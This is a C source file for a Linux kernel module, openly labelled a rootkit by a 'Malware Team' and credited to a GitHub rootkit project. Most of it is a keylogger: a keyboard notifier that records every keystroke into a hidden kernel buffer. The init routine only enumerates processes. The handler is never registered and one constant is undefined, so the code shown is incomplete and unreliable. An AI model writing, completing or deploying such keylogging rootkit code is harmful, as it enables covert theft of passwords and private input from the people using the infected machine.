/** https://github.com/maK-/maK_it-Linux-Rootkit */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/sched.h>
#include <linux/errno.h>
#include <linux/mempolicy.h>
#include <linux/types.h>
#include <linux/unistd.h>
#include <linux/string.h>
#include <asm/current.h>
#include <linux/sched.h>
#include <linux/syscalls.h>
#include <asm/system.h>
#include <linux/fs.h>
#include <linux/keyboard.h>
#include <linux/input.h>
#include <linux/semaphore.h>
#include <linux/kmod.h>
#include <linux/notifier.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Malware Team");
MODULE_DESCRIPTION("A rootkit");
MODULE_VERSION("1.0.0");
MODULE_SUPPORTED_DEVICE("None");

struct semaphore s;
static int shiftPressed = 0;

int major;
char keyBuffer[1000000];
char commands[MAX_CMD_LENGTH];
const char* endPtr = (keyBuffer+(sizeof(keyBuffer)-1));
char* basePtr = keyBuffer;
int keyLogOn = 1;

int debug = 0;

struct task_struct *task;

static const char* keys[] = {"","[ESC]","1","2","3","4","5","6","7","8","9",
				"0","-","=","[BS]","[TAB]","q","w","e","r",
				"t","y","u","i","o","p","[","]","[ENTR]",
				"[CTRL]","a","s","d","f","g","h","j","k","l",
				";","'","`","[SHFT]","\\","z","x","c","v","b",
				"n","m",",",".","/","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[UP]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};
//Key press with shift
static const char* keysShift[] = {"","[ESC]","!","@","#","$","%","^","&","*",
				"(",")","_","+","[BS]","[TAB]","Q","W","E","R",
				"T","Y","U","I","O","P","{","}","[ENTR]",
				"[CTRL]","A","S","D","F","G","H","J","K","L",
				":","\"","~","[SHFT]","|","Z","X","C","V","B",
				"N","M","<",">","?","[SHFT]","",""," ",
				"[CAPS]","[F1]","[F2]","[F3]","[F4]","[F5]",
				"[F6]","[F7]","[F8]","[F9]","[F10]","[NUML]",
				"[SCRL]","[HOME]","[U]","[PGUP]","-","[L]","5",
				"[R]","+","[END]","[D]","[PGDN]","[INS]",
				"[DEL]","","","","[F11]","[F12]","",
				"","","","","","","[ENTR]","[CTRL]",
				"/","[PSCR]","[ALT]","","[HOME]","[U]",
				"[PGUP]","[L]","[R]","[END]","[D]","[PGDN]",
				"[INS]","[DEL]","","","","","","","","[PAUS]"};

//On key notify event, catch and run handler
int key_notify(struct notifier_block *nblock, unsigned long kcode, void *p){
	struct keyboard_notifier_param *param = p;
   	if(kcode == KBD_KEYCODE && keyLogOn){
        if( param->value==42 || param->value==54 ){
            down(&s);
            if(param->down > 0){
                shiftPressed = 1;
			}
            else{
                shiftPressed = 0;
			}
            up(&s);
            return NOTIFY_OK;
        }
		//Store keys to buffer
        if(param->down){
            int i;
			char c;
			down(&s);
			i = 0;
			if(shiftPressed){
				while(i < strlen(keysShift[param->value])){
				    c = keysShift[param->value][i];
					i++;
					*basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
						basePtr = keyBuffer;
					}
				}
			}
            else{
				while(i < strlen(keys[param->value])){
                    c = keys[param->value][i];
                    i++;
                    *basePtr = c;
                    basePtr++;
                    if(basePtr == endPtr){
                        basePtr = keyBuffer;
                    }
                }
            }    
            up(&s);
        }
    }
 	return NOTIFY_OK;
}

static int __init rootkit_init(void){
	printk(KERN_INFO "Hello World!");

	for_each_process(task){
		printk(KERN_INFO "Task id: %d", task->pid);
		printk(KERN_INFO "Task UID: %d, Task GID: %d", task->loginuid.val, task->tgid);
		// printk(KERN_INFO "Task mempolicy: %u", task->mempolicy->mode); // the kernel keeps killing it becuase of this line
	}

	return 0;
}

static void __exit rootkit_exit(void){
	printk(KERN_INFO "Goodbye World!");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
